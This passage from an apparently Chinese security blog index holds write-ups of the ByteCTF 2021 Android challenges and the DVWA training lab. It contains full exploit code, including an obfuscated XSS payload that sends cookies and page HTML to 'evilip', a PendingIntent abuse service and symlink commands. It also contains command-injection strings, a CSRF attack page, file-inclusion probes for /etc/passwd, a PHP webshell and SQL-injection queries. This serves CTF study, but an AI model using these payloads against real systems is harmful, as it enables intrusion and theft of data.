Runtime.getRuntime().exec(\"ln -s \" + cookies + \" \" + symlink).waitFor(); Runtime.getRuntime().exec(\"chmod -R 777 \" + root).waitFor(); } catch (PackageManager.NameNotFoundException e) { e.printStackTrace(); } catch (InterruptedException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); } return symlink; } } loadcookie.html: \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003ch1\u003e injected cookie with xss\u003c/h1\u003e \u003cscript\u003e document. cookie = \"x = '\u003cimg src=\\\"x\\\" onerror=\\\"eval(atob('bmV3IEltYWdlKCkuc3JjID0gImh0dHA6Ly9ldmlsaXAvP2Nvb2tpZT0iICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCJodG1sIilbMF0uaW5uZXJIVE1MKTs='))\\\"\u003e'\" \u003c/script\u003e \u003c/html\u003e \u003c!--new Image().src = \"http://evilip/?cookie=\" + encodeURIComponent(document.getElementsByTagName(\"html\")[0].innerHTML);--\u003e loadfile.html: \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003ch1\u003eload file\u003c/h1\u003e \u003cscript\u003e document.location = \"intent:#Intent;launchFlags=0x3;package=com.bytectf.easydroid;component=com.bytectf.easydroid/.TestActivity;S.url=file:///data/user/0/com.bytectf.pwneasydroid/symlink.html;end\"; \u003c/script\u003e \u003c/html\u003e 在自己写intent隐式跳转的时候，intent的具体格式搜了挺久才找到正确的写法，然后其实有直接转String的方法: Intent i2 = new Intent(); i2.setClassName(\"com.bytectf.easydroid\", \"com.bytectf.easydroid.TestActivity\"); i2.putExtra(\"url\", url); String uri_data = i2.toUri(Intent.URI_INTENT_SCHEME); // 在这里直接转String intent.setData(Uri.parse(\"http://ip/jump.html?url=\" + Uri.encode(uri_data))); ","date":"2021-10-17","objectID":"/bytectf2021-pre/:3:3","tags":null,"title":"Bytectf2021初赛","uri":"/bytectf2021-pre/"},{"categories":["writeup"],"content":"mediumdroid ","date":"2021-10-17","objectID":"/bytectf2021-pre/:4:0","tags":null,"title":"Bytectf2021初赛","uri":"/bytectf2021-pre/"},{"categories":["writeup"],"content":"Apk分析 与easydroid类似，但是flag没有存储在Cookie中，而是跟babydroid一样存储在flag文件中。 在TestActivity中提供了一个jsi public class TestActivity extends Activity { /* access modifiers changed from: protected */ public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); String url = getIntent().getStringExtra(\"url\"); WebView webView = new WebView(getApplicationContext()); setContentView(webView); webView.getSettings().setJavaScriptEnabled(true); webView.addJavascriptInterface(this, \"jsi\"); webView.loadUrl(url); } @JavascriptInterface public void Te3t(String title, String content) { if (Build.VERSION.SDK_INT \u003e= 26) { ((NotificationManager) getSystemService(NotificationManager.class)).createNotificationChannel(new NotificationChannel(\"CHANNEL_ID\", \"CHANNEL_NAME\", 4)); } NotificationManagerCompat.from(this).notify(100, new NotificationCompat.Builder(this, \"CHANNEL_ID\").setContentTitle(title).setContentText(content).setSmallIcon(R.mipmap.ic_launcher).setContentIntent(PendingIntent.getBroadcast(this, 0, new Intent(), 0)).setAutoCancel(true).setPriority(1).build()); } } 其中PendingIntent.getBroadcast(this, 0, new Intent()存在BroadcastAnywhere漏洞。借助这个漏洞可以写一个NotificationListenerService(监听通知栏的消息)进行监听，然后由于直接使用new Intent()，action，category，data，clipdata，package均为空可以被修改。将action和package修改成FlagReceiver接受的广播就可以在flag文件中写入xss payload，后面再用file协议加载flag文件即可。 ","date":"2021-10-17","objectID":"/bytectf2021-pre/:4:1","tags":null,"title":"Bytectf2021初赛","uri":"/bytectf2021-pre/"},{"categories":["writeup"],"content":"攻击过程 调用MainActivity，跳转到TestActivity，url指向的网页内容写调用jsi.Te3t的代码。 用来监听的NotificationListenerService会监听到对应的广播PendingIntent，将action设置成SET_FLAG，内容设置成xss payload然后转发出去。 调用MainActivity，跳转到TestActivity，url指向的symlink.html(flag文件的链接) ","date":"2021-10-17","objectID":"/bytectf2021-pre/:4:2","tags":null,"title":"Bytectf2021初赛","uri":"/bytectf2021-pre/"},{"categories":["writeup"],"content":"Exp MainActivity: public class MainActivity extends AppCompatActivity { public String target = \"com.bytectf.mediumdroid\"; public String evil = \"http://evilip/\"; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); startService(new Intent(this, MagicService.class)); launch(evil + \"callTe3t.html\"); new Handler().postDelayed(new Runnable() { @Override public void run() { launch(\"file://\" + symlink()); } }, 5000); } private void launch(String url){ Intent main_intent = new Intent(); main_intent.setClassName(target, target + \".MainActivity\"); main_intent.addFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION | Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION); Intent test_intent = new Intent(); test_intent.setClassName(target, target + \".TestActivity\"); test_intent.putExtra(\"url\", url); String test_intent_uri = test_intent.toUri(Intent.URI_INTENT_SCHEME); main_intent.setData(Uri.parse(\"http://toutiao.com@evilip/jump.html?url=\" + Uri.encode(test_intent_uri))); startActivity(main_intent); } private String symlink() { String root = getApplicationInfo().dataDir; String symlink = root + \"/symlink.html\"; Log.e(\"url\", symlink); try{ String cookies = getPackageManager().getApplicationInfo(target, 0).dataDir + \"/files/flag\"; Runtime.getRuntime().exec(\"rm \" + symlink).waitFor(); Runtime.getRuntime().exec(\"ln -s \" + cookies + \" \" + symlink).waitFor(); Runtime.getRuntime().exec(\"chmod -R 777 \" + root).waitFor(); } catch (PackageManager.NameNotFoundException e) { e.printStackTrace(); } catch (InterruptedException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); } return symlink; } } MagicService: public class MagicService extends NotificationListenerService { public String target = \"com.bytectf.mediumdroid\"; public String payload = \"xss payload\"; @Override public void onCreate() { super.onCreate(); Log.e(target, \"onCreate\"); } @Override public void onListenerConnected() { super.onListenerConnected(); Log.e(target, \"onListen\"); } @RequiresApi(api = Build.VERSION_CODES.KITKAT) @Override public void onNotificationPosted(StatusBarNotification sbn) { if(!sbn.getPackageName().equals(target)) return; Notification notification = sbn.getNotification(); if(notification.extras != null){ PendingIntent pendingIntent = notification.contentIntent; Intent evil_intent = new Intent(); evil_intent.setAction(\"com.bytectf.SET_FLAG\"); evil_intent.setPackage(target); evil_intent.putExtra(\"flag\", payload); try { pendingIntent.send(this, 0, evil_intent); } catch (PendingIntent.CanceledException e) { e.printStackTrace(); } } super.onNotificationPosted(sbn); } @Override public void onNotificationRemoved(StatusBarNotification sbn) { super.onNotificationRemoved(sbn); Log.e(target, \"onNotificationRemoved\"); } } jump.html:(可以根据url参数的内容做跳转) \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003ch1\u003eJump to TestActivity\u003c/h1\u003e \u003cscript\u003e function GetQueryString(name) { var reg = new RegExp(\"(^|\u0026)\"+ name +\"=([^\u0026]*)(\u0026|$)\"); var r = window.location.search.substr(1).match(reg); if(r!=null) return unescape(r[2]); return null; } function doitjs() { location.href = decodeURIComponent(GetQueryString('url')); } setTimeout(doitjs, 0); \u003c/script\u003e \u003c/html\u003e callTe3t.html \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003cbody\u003e \u003ch1\u003ejsi test\u003c/h1\u003e \u003cscript\u003ejsi.Te3t('test1', 'test2');\u003c/script\u003e \u003c/body\u003e \u003c/html\u003e Manifest.xml: \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003cmanifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"com.bytectf.pwnmediumdroid\"\u003e \u003cuses-permission android:name=\"android.permission.INTERNET\"/\u003e \u003capplication android:allowBackup=\"true\" android:icon=\"@mipmap/ic_launcher\" android:label=\"@string/app_name\" android:roundIcon=\"@mipmap/ic_launcher_round\" android:supportsRtl=\"true\" android:theme=\"@style/AppTheme\"\u003e \u003cservice android:name=\".MagicService\" android:enabled=\"true\" android:exported=\"true\" android:permission=\"android.permission.BIND_NOTIFICATION_LIST","date":"2021-10-17","objectID":"/bytectf2021-pre/:4:3","tags":null,"title":"Bytectf2021初赛","uri":"/bytectf2021-pre/"},{"categories":["writeup"],"content":"参考链接 Android: Access to app protected components 安卓漏洞从0到1–PPT 安卓漏洞从0到1–视频 2020 看雪SDC议题回顾 | Android WebView安全攻防指南2020 android(8)-WebView安全 ByteCTF 2021 By W\u0026M（PWN）部分 ","date":"2021-10-17","objectID":"/bytectf2021-pre/:5:0","tags":null,"title":"Bytectf2021初赛","uri":"/bytectf2021-pre/"},{"categories":["writeup"],"content":"复习一些web强身健体（不是 其中webshell部分的eval被我改成了evaltest，不然windows defender总报… ","date":"2021-10-13","objectID":"/dvwa/:0:0","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"环境 https://github.com/ethicalhack3r/DVWA docker启动 docker run --rm -it -p 80:80 vulnerables/web-dvwa 默认凭证: admin/password https://www.freebuf.com/articles/web/274058.html burp的四种攻击模式：https://blog.csdn.net/huilan_same/article/details/64440284 ","date":"2021-10-13","objectID":"/dvwa/:1:0","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"Brute Force ","date":"2021-10-13","objectID":"/dvwa/:2:0","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"low \u003c?php if( isset( $_GET[ 'Login' ] ) ) { // Get username $user = $_GET[ 'username' ]; // Get password $pass = $_GET[ 'password' ]; $pass = md5( $pass ); // Check the database $query = \"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '\u003cpre\u003e' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '\u003c/pre\u003e' ); if( $result \u0026\u0026 mysqli_num_rows( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[\"avatar\"]; // Login successful echo \"\u003cp\u003eWelcome to the password protected area {$user}\u003c/p\u003e\"; echo \"\u003cimg src=\\\\\"{$avatar}\\\\\" /\u003e\"; } else { // Login failed echo \"\u003cpre\u003e\u003cbr /\u003eUsername and/or password incorrect.\u003c/pre\u003e\"; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res); } ?\u003e get请求中的username和password可以直接爆破 将请求数据发送到 Intruder 模块进行暴力破解，爆破字典使用 Kali 内置的字典/usr/share/wordlists/fasttrack.txt,使用 § 符号标记需要测试的数据 根据返回的数据长度推测爆破成功，即密码为 password ","date":"2021-10-13","objectID":"/dvwa/:2:1","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"medium \u003c?php if( isset( $_GET[ 'Login' ] ) ) { // Sanitise username input $user = $_GET[ 'username' ]; $user = ((isset($GLOBALS[\"___mysqli_ston\"]) \u0026\u0026 is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $user ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Sanitise password input $pass = $_GET[ 'password' ]; $pass = ((isset($GLOBALS[\"___mysqli_ston\"]) \u0026\u0026 is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass = md5( $pass ); // Check the database $query = \"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '\u003cpre\u003e' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '\u003c/pre\u003e' ); if( $result \u0026\u0026 mysqli_num_rows( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[\"avatar\"]; // Login successful echo \"\u003cp\u003eWelcome to the password protected area {$user}\u003c/p\u003e\"; echo \"\u003cimg src=\\\\\"{$avatar}\\\\\" /\u003e\"; } else { // Login failed sleep( 2 ); echo \"\u003cpre\u003e\u003cbr /\u003eUsername and/or password incorrect.\u003c/pre\u003e\"; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res); } ?\u003e 对user和pass进行了过滤，使用了mysql_real_escape_string函数，会对字符串中的特殊字符进行转义，防止注入。而且在失败以后添加了sleep函数，爆破会慢一些，但是步骤不变。 ","date":"2021-10-13","objectID":"/dvwa/:2:2","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"high \u003c?php if( isset( $_GET[ 'Login' ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Sanitise username input $user = $_GET[ 'username' ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS[\"___mysqli_ston\"]) \u0026\u0026 is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $user ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Sanitise password input $pass = $_GET[ 'password' ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS[\"___mysqli_ston\"]) \u0026\u0026 is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass = md5( $pass ); // Check database $query = \"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '\u003cpre\u003e' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '\u003c/pre\u003e' ); if( $result \u0026\u0026 mysqli_num_rows( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[\"avatar\"]; // Login successful echo \"\u003cp\u003eWelcome to the password protected area {$user}\u003c/p\u003e\"; echo \"\u003cimg src=\\\\\"{$avatar}\\\\\" /\u003e\"; } else { // Login failed sleep( rand( 0, 3 ) ); echo \"\u003cpre\u003e\u003cbr /\u003eUsername and/or password incorrect.\u003c/pre\u003e\"; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res); } // Generate Anti-CSRF token generateSessionToken(); ?\u003e 加入的token来防御CSRF同时增加爆破难度。 同样使用 Burp Suite，先将请求数据发送给 Intruder 模块，用 § 符号标记需要测试的两个数据，一个是 password，另一个是 user_token，本次使用 Pitchfork 攻击方式。 在 Option 选项中找到 Grep - Extract，设置从响应中获取 user_token ，这里用光标选中想要的内容即可。 第一个数据 password 仍然使用 Kali 内置的爆破字典 /usr/share/wordlists/fasttrack.txt； 第二个数据 user_token 从响应页面中递归获取，起始数据为当前未提交登录的页面的 user_token。 根据响应长度排序可以得到正确的password ","date":"2021-10-13","objectID":"/dvwa/:2:3","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"Common Injection 命令注入（Command Injection），对一些函数的参数没有做过滤或过滤不严导致的，可以执行系统或者应用指令（CMD命令或者bash命令）的一种注入攻击手段。PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一 shell 环境中用于拼接命令的符号有以下几个： \u0026 --\u003e 前一条命令在后台运行 \u0026\u0026 --\u003e 当且仅当前一条命令执行成功后执行下一条命令 || --\u003e 当且仅当前一条命令执行失败后执行下一条命令 | --\u003e 将前一条命令的标准输出（stdout）作为下一条命令的输入 ; --\u003e 无论前一条指令是否执行成功，都执行下一条指令 ","date":"2021-10-13","objectID":"/dvwa/:3:0","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"low \u003c?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $target = $_REQUEST[ 'ip' ]; // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"\u003cpre\u003e{$cmd}\u003c/pre\u003e\"; } ?\u003e 没有加任何防护，直接注入命令127.0.0.1 \u0026\u0026 whoami ","date":"2021-10-13","objectID":"/dvwa/:3:1","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"medium \u003c?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $target = $_REQUEST[ 'ip' ]; // Set blacklist $substitutions = array( '\u0026\u0026' =\u003e '', ';' =\u003e '', ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"\u003cpre\u003e{$cmd}\u003c/pre\u003e\"; } ?\u003e 在 Low 的基础上使用 str_replace 过滤符号 \u0026\u0026 和 ;。 || 、 | 、\u0026 仍然可以使用，此外还可以使用 \u0026\u0026\u0026 、 \u0026;\u0026 等，过滤后就变为 \u0026 、 \u0026\u0026，同样可以实现漏洞利用。 # ping a.b.c.d 失败，继续执行 ifconfig a.b.c.d||ifconfig # ifconfig 不接受输入 127.0.0.1|ifconfig # ping 127.0.0.1 后台结束后返回 127.0.0.1\u0026ifconfig ","date":"2021-10-13","objectID":"/dvwa/:3:2","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"high \u003c?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $target = trim($_REQUEST[ 'ip' ]); // Set blacklist $substitutions = array( '\u0026' =\u003e '', ';' =\u003e '', '| ' =\u003e '', '-' =\u003e '', '$' =\u003e '', '(' =\u003e '', ')' =\u003e '', '`' =\u003e '', '||' =\u003e '', ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"\u003cpre\u003e{$cmd}\u003c/pre\u003e\"; } ?\u003e 使用 trim 去除字符串首尾的空白字符，然后又过滤了许多符号，但是没有过滤 | ，显然可以利用。 使用管道符 | 即可。 127.0.0.1|ifconfig ","date":"2021-10-13","objectID":"/dvwa/:3:3","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"CSRF Cross-site request forgery，跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。 ","date":"2021-10-13","objectID":"/dvwa/:4:0","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"low 修改密码的链接：http://localhost/vulnerabilities/csrf/?password_new=132\u0026password_conf=23\u0026Change=Change# 在源码中只要password_new与password_conf一致即可修改密码。故直接发送上述链接吸引受害者点击即可修改密码。 ","date":"2021-10-13","objectID":"/dvwa/:4:1","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"medium 相比于low添加了如下校验： stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false 即用户的请求头中的Referer字段必须包含了服务器的名字。 使用burp对其进行修改 ","date":"2021-10-13","objectID":"/dvwa/:4:2","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"high 加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器都会返回一个随机的token，当浏览器向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。 http://localhost/vulnerabilities/csrf/?password_new=12\u0026password_conf=12\u0026Change=Change\u0026user_token=14299b179fba1e1934cc198a1a884bdc# checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 这里想要达到攻击目的的话需要获取token。这里只有构造一个攻击页面，将其放置在目标服务器，引诱受害者访问，从而完成CSRF攻击。 \u003cscript type=\"text/javascript\"\u003e function attack() { document.getElementsByName('user_token')[0].value=document.getElementById(\"hack\").contentWindow.document.getElementsByName('user_token')[0].value; document.getElementById(\"transfer\").submit(); } \u003c/script\u003e \u003ciframe src=\"\u003chttp://192.168.109.136/dvwa/vulnerabilities/csrf\u003e\" id=\"hack\" border=\"0\" style=\"display:none;\"\u003e \u003c/iframe\u003e \u003cbody onload=\"attack()\"\u003e \u003cform method=\"GET\" id=\"transfer\" action=\"\u003chttp://localhost/vulnerabilities/csrf\u003e\"\u003e \u003cinput type=\"hidden\" name=\"password_new\" value=\"password\"\u003e \u003cinput type=\"hidden\" name=\"password_conf\" value=\"password\"\u003e \u003cinput type=\"hidden\" name=\"user_token\" value=\"\"\u003e \u003cinput type=\"hidden\" name=\"Change\" value=\"Change\"\u003e \u003c/form\u003e \u003c/body\u003e 如果把上述页面加入到目标服务器，当受害者点击这个页面，脚本会通过一个看不见的框架访问修改密码的页面获取页面中的token，并向服务器发送修改密码的请求，以完成CSFR攻击。 因为跨域问题，所以这个攻击代码需要注入到目标服务器中才可能完成攻击，可以利用XSS漏洞协助获取CSRF token。 ","date":"2021-10-13","objectID":"/dvwa/:4:3","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"文件包含 ","date":"2021-10-13","objectID":"/dvwa/:5:0","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"文件包含与漏洞 文件包含: 开发人员将相同的函数写入单独的文件中,需要使用某个函数时直接调用此文件,无需再次编写,这种文件调用的过程称文件包含。 文件包含漏洞: 开发人员为了使代码更灵活,会将被包含的文件设置为变量,用来进行动态调用,从而导致客户端可以恶意调用一个恶意文件,造成文件包含漏洞。 ","date":"2021-10-13","objectID":"/dvwa/:5:1","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"文件包含漏洞用到的函数 require:找不到被包含的文件，报错，并且停止运行脚本。 include:找不到被包含的文件,只会报错，但会继续运行脚本。 require_once:与require类似,区别在于当重复调用同一文件时,程序只调用一次。 include_once:与include类似,区别在于当重复调用同一文件时,程序只调用一次。 ","date":"2021-10-13","objectID":"/dvwa/:5:2","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"目录遍历与文件包含的区别 目录遍历是可以读取web目录以外的其他目录,根源在于对路径访问权限设置不严格，针对本系统。 文件包含是利用函数来包含web目录以外的文件，分为本地包含和远程包含。 ","date":"2021-10-13","objectID":"/dvwa/:5:3","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"文件包含特征 ?page=a.php ?home=b.html ?file=content ","date":"2021-10-13","objectID":"/dvwa/:5:4","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"检测方法 ?file=../../../../etc/passwd ?page=file:///etc/passwd ?home=main.cgi ?page=http://www.a.com/1.php \u003chttp://1.1.1.1/dir/file.txt\u003e ","date":"2021-10-13","objectID":"/dvwa/:5:5","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"low 没有任何过滤，可以进行包含任意文件。 \u003chttp://127.0.0.1/vulnerabilities/fi/?page=http://127.0.0.1/phpinfo.php\u003e ","date":"2021-10-13","objectID":"/dvwa/:5:6","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"medium 添加了两个过滤条件： $file = str_replace( array( \"http://\", \"https://\" ), \"\", $file ); $file = str_replace( array( \"../\", \"..\\\\\"\" ), \"\", $file); 使用 str_replace 函数进行过滤是很不安全的，因为可以使用双写绕过。例如，我们包含 hthttp://tp://xx 时, str_replace 函数只会过滤一个 http:// ，所以最终还是会包含到 http://xx \u003chttp://127.0.0.1/vulnerabilities/fi/?page=htthttp://p://127.0.0.1/phpinfo.php\u003e ","date":"2021-10-13","objectID":"/dvwa/:5:7","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"high 添加了如下过滤: // Input validation if( !fnmatch( \"file*\", $file ) \u0026\u0026 $file != \"include.php\" ) { // This isn't the page we want! echo \"ERROR: File not found!\"; exit; } fnmatch() 函数根据指定的模式来匹配文件名或字符串。 对包含的文件名进行了限制，必须为 file* 或者 include.php ，否则会提示Error：File not found。 可以利用 file 协议进行绕过。 \u003chttp://127.0.0.1/vulnerabilities/fi/?page=file:///D:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\DVWA1\\\\vulnerabilities\\\\fi\\\\test.txt\u003e ","date":"2021-10-13","objectID":"/dvwa/:5:8","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"文件上传 文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞。 ","date":"2021-10-13","objectID":"/dvwa/:6:0","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"low 没有对文件做任何限制，可以直接上传webshell \u003c?php @evaltest($_POST['zxl']); ?\u003e 将上述内容写入1.php文件进行上传 使用中国菜刀连接 ","date":"2021-10-13","objectID":"/dvwa/:6:1","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"medium // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; // Is it an image? if( ( $uploaded_type == \"image/jpeg\" || $uploaded_type == \"image/png\" ) \u0026\u0026 ( $uploaded_size \u003c 100000 ) ) { // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) { // No echo '\u003cpre\u003eYour image was not uploaded.\u003c/pre\u003e'; } else { // Yes! echo \"\u003cpre\u003e{$target_path}succesfully uploaded!\u003c/pre\u003e\"; } } 对文件类型进行了限制，只接受图片格式的文件。可以用burp进行文件名的修改 将这个1.jpg修改成1.php即可，后续步骤相同。 ","date":"2021-10-13","objectID":"/dvwa/:6:2","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"high // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; $uploaded_tmp = $_FILES[ 'uploaded' ][ 'tmp_name' ]; // Is it an image? if( ( strtolower( $uploaded_ext ) == \"jpg\" || strtolower( $uploaded_ext ) == \"jpeg\" || strtolower( $uploaded_ext ) == \"png\" ) \u0026\u0026 ( $uploaded_size \u003c 100000 ) \u0026\u0026 getimagesize( $uploaded_tmp ) ) { 直接对文件名进行限制。 使用edjpgcom.exe工具制作图片马即可。 ","date":"2021-10-13","objectID":"/dvwa/:6:3","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"SQL注入 ","date":"2021-10-13","objectID":"/dvwa/:7:0","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"low \u003c?php if( isset( $_REQUEST[ 'Submit' ] ) ) { // Get input $id = $_REQUEST[ 'id' ]; // Check database $query = \"SELECT first_name, last_name FROM users WHERE user_id = '$id';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '\u003cpre\u003e' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '\u003c/pre\u003e' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) { // Get values $first = $row[\"first_name\"]; $last = $row[\"last_name\"]; // Feedback for end user echo \"\u003cpre\u003eID: {$id}\u003cbr /\u003eFirst name: {$first}\u003cbr /\u003eSurname: {$last}\u003c/pre\u003e\"; } mysqli_close($GLOBALS[\"___mysqli_ston\"]); } ?\u003e 没有任何过滤直接手工注入 # 判断是否为注入 ?id=1' or '1'='1 ?id=1' or '1'='2 # 判断字段长度（2 正常，3 异常） ?id=1' order by 2 -- ?id=1' order by 3 -- # 确定回显点 ?id=1' union select 111,222 -- # 用户名和数据库名称 ?id=1' union select user(),database() -- -- output：admin@localhost、dvwa # 查看当前用户和 mysql 版本 ?id=1' union select current_user(),version() -- -- output：First name: admin@%、 5.5.47-0ubuntu0.14.04.1 # 爆表名 ?id=1' union select 1,group_concat(table_name) from information_schema.tables where table_schema =database() -- -- output：guestbook,users 